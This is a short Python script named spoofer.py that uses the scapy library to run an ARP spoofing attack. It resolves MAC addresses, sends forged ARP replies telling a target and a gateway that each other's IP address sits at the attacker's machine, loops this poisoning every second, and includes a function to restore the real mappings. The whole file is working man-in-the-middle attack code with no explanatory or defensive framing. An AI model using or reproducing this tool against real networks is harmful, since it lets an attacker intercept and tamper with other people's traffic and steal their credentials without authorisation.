#!/usr/bin/env python3
# spoofer.py

from scapy.all import Ether, ARP, srp, send
import argparse
from time import sleep
import os
import sys

def get_mac(ip):

	ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
	if ans:
		return ans[0][1].src


def spoof(target_ip, gateway_ip, verbose=True):

	target_mac = get_mac(target_ip)
	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, op='is-at')
	send(arp_response, verbose=0)

	if verbose:
		self_mac = ARP().hwsrc
		print("Sent to {} : {} is-at {}".format(target_ip, gateway_ip, self_mac))


def restore(target_ip, gateway_ip, verbose=True):

	target_mac = get_mac(target_ip)
	gateway_mac = get_mac(gateway_ip)

	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op='is-at')
	send(arp_response, verbose=0, count=7)
	if verbose:
		print("Sent to {} : {} is-at {}".format(target_ip, gateway_ip, gateway_mac))


def arpSpoof(target, host, verbose):
	while True:
		spoof(target, host, verbose)
		spoof(host, target, verbose)
		sleep(1)

